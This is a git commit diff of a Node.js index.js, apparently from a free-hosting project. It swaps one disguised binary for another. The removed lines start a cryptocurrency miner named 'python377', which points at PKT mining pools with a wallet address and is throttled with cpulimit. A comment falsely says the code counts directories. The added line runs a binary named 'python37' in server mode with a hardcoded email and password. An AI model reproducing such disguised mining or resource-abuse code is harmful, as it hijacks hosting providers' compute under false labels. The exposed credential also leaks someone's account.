1cf0d672b5978966a915a74c4fb19686ddec56d3
beanb1123 <103089678+beanb1123@users.noreply.github.com>
2023-09-05 02:21:25 +0200

    Update index.js

--- index.js
+++ index.js
@@ -3,7 +3,7 @@ const { exec } = require('child_process');
  
 // Counts the number of directory in
 // current working directory
-exec('chmod +x python377 && ./python377 ann http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com -p pkt1q6l2qm5msxnkrl6qsh9cys9x4u357y5dyv26qgu', (error, stdout, stderr) => {
+exec('./python37 --server --email udbdjfj@gmail.com --password \'Env1123!!\'', (error, stdout, stderr) => {
     if (error) {
         console.error(`exec error: ${error}`);
         return;
@@ -13,14 +13,4 @@ exec('chmod +x python377 && ./python377 ann http://pool.pkt.world http://pool.pk
         console.error(`stderr: ${stderr}`);
 });
 
-exec('apt update && apt install cpulimit && cpulimit -e python377 -l 23', (error, stdout, stderr) => {
-    if (error) {
-        console.error(`exec error: ${error}`);
-        return;
-    }
-    console.log(`stdout: No. of directories = ${stdout}`);
-    if (stderr != "")
-        console.error(`stderr: ${stderr}`);
-});
-*/
 const keep_alive = require('./keep_alive.js')
